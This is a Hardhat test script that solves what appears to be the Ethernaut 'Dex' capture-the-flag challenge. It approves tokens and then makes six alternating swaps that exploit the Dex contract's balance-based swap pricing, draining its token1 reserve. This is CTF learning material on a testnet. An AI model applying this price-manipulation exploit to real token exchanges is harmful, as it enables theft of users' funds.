const { assert } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, challenge, challengeAddress, tx, attacker

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]

    challengeAddress = process.env.CHALLENGEADDRESS22 //address of my instance contract
    const challengeFactory = await ethers.getContractFactory(`Dex`)
    challenge = await challengeFactory.attach(challengeAddress)

    const attackerFactory = await ethers.getContractFactory(`DexAttacker`)
    attacker = await attackerFactory.deploy(challenge.address)
})

it("Solves the challenge 'Dex'", async () => {
    /*
    In this challenge the tokens are given to account
    which made a new instance - in my case it is my
    account in the metamask. Therefor I don't solve this in the
    local host, but on the Rinkeby. If you want to use it write in the console
    yarn hardhat test test/22-Dex.js --network rinkeby
    */

    /*
    Firstly we have to give approval to Dex contract to
    use our tokens. 
    */
    await challenge.approve(challenge.address, 250)
    let token1 = await challenge.token1()
    let token2 = await challenge.token2()

    /*
    In the next step we will make few swap of tokens,
    using the security gap inside the getSwapPrice function.
    This security gap is called price oracle.
     */
    tx = await challenge.swap(token1, token2, 10)
    await tx.wait(1)

    tx = await challenge.swap(token2, token1, 20)
    await tx.wait(1)

    tx = await challenge.swap(token1, token2, 24)
    await tx.wait(1)

    tx = await challenge.swap(token2, token1, 30)
    await tx.wait(1)

    tx = await challenge.swap(token1, token2, 41)
    await tx.wait(1)

    tx = await challenge.swap(token2, token1, 45)
    await tx.wait(1)

    /*
    Let's check if we took all tokens from Dex contact.
    */
    let balance = await challenge.balanceOf(token1, challenge.address)
    assert(balance.toString() == "0", "You didn't take everything!")
})
